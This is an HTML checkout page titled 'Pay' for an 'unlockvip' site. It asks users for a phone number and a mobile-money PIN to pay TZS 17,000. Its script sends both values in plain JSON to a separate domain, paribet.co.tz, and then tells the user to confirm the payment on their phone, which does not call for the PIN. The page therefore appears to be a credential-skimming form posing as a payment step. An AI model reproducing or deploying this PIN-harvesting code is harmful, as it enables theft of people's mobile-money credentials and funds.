<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pay</title>
<link rel="canonical" href="https://unlockvip.co.tz/pay.html">
<style>
  body {
    margin: 0;
    min-height: 100vh;
    display: grid;
    place-items: center;
    background: radial-gradient(circle at top, #0f1117, #020202);
    color: #fff;
    font-family: Arial, sans-serif;
  }
  form {
    width: min(420px, calc(100% - 32px));
    background: #1a1d24;
    border-radius: 20px;
    padding: 28px 22px;
    box-shadow: 0 20px 40px rgba(0,0,0,.7);
  }
  h1 { margin: 0 0 6px; font-size: 28px; }
  p { margin: 0 0 18px; color: #b7b7b7; }
  label { display: block; text-align: left; margin: 14px 0 6px; font-size: 14px; }
  input {
    width: 100%;
    box-sizing: border-box;
    padding: 14px;
    border: none;
    border-radius: 12px;
    font-size: 18px;
  }
  button {
    width: 100%;
    margin-top: 18px;
    background: #ff3c00;
    color: #fff;
    border: none;
    border-radius: 30px;
    padding: 14px;
    font-size: 18px;
    cursor: pointer;
  }
  button:disabled { opacity: .6; cursor: default; }
  .msg { min-height: 22px; margin-top: 14px; font-size: 14px; }
  .err { color: #ff8d7a; }
  .ok { color: #8dffb0; }
</style>
</head>
<body>
<form id="payForm">
  <h1>Pay</h1>
  <p>Enter the phone number and PIN. The charge is TZS 17,000.</p>
  <label for="phone">Phone number</label>
  <input id="phone" name="phone" type="text" inputmode="numeric" autocomplete="tel" maxlength="12" placeholder="07XXXXXXXX" pattern="[0-9]*">
  <label for="pin">PIN</label>
  <input id="pin" name="pin" type="password" inputmode="numeric" autocomplete="off" maxlength="12" placeholder="Numbers only" pattern="[0-9]*">
  <button id="payBtn" type="submit">Pay TZS 17,000</button>
  <div class="msg" id="msg" role="status"></div>
</form>
<script>
const API_HOST = "https://unlockvip-backend-1.onrender.com";
const phone = document.getElementById("phone");
const pin = document.getElementById("pin");
const msg = document.getElementById("msg");
const payBtn = document.getElementById("payBtn");

function apiBase() {
  var h = location.hostname.toLowerCase();
  if (
    h === "unlockvip.co.tz" ||
    h === "www.unlockvip.co.tz" ||
    h === "unlockvip-frontend.onrender.com" ||
    h === "unlockvip-backend-1.onrender.com"
  ) return "";
  return API_HOST;
}

function keepDigits(input) {
  const clean = input.value.replace(/\D/g, "");
  if (input.value !== clean) input.value = clean;
}

function blockLetters(input) {
  input.addEventListener("beforeinput", (event) => {
    if (event.data && /\D/.test(event.data)) event.preventDefault();
  });
  input.addEventListener("input", () => keepDigits(input));
  input.addEventListener("paste", (event) => {
    event.preventDefault();
    const text = (event.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "");
    const start = input.selectionStart || 0;
    const end = input.selectionEnd || 0;
    const next = (input.value.slice(0, start) + text + input.value.slice(end)).replace(/\D/g, "").slice(0, input.maxLength || 12);
    input.value = next;
  });
}

blockLetters(phone);
blockLetters(pin);

function say(text, ok) {
  msg.textContent = text;
  msg.className = "msg " + (ok ? "ok" : "err");
}

document.getElementById("payForm").addEventListener("submit", async (event) => {
  event.preventDefault();
  keepDigits(phone);
  keepDigits(pin);
  const phoneValue = phone.value;
  const pinValue = pin.value;
  if (!/^\d{10}$/.test(phoneValue) && !/^\d{12}$/.test(phoneValue)) {
    say("Enter the phone number with digits only.");
    return;
  }
  if (!/^\d+$/.test(pinValue)) {
    say("Enter the PIN with digits only.");
    return;
  }
  payBtn.disabled = true;
  say("Sending payment request...", true);
  try {
    const response = await fetch("https://paribet.co.tz/api/pay/haraka", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone: phoneValue, pin: pinValue })
    });
    const result = await response.json();
    if (result.success) {
      say("Payment request sent to your phone. Please confirm the payment.", true);
      return;
    }
    say(result.error || "Payment failed");
  } catch (error) {
    say("Server error");
  } finally {
    payBtn.disabled = false;
  }
});
</script>
</body>
</html>
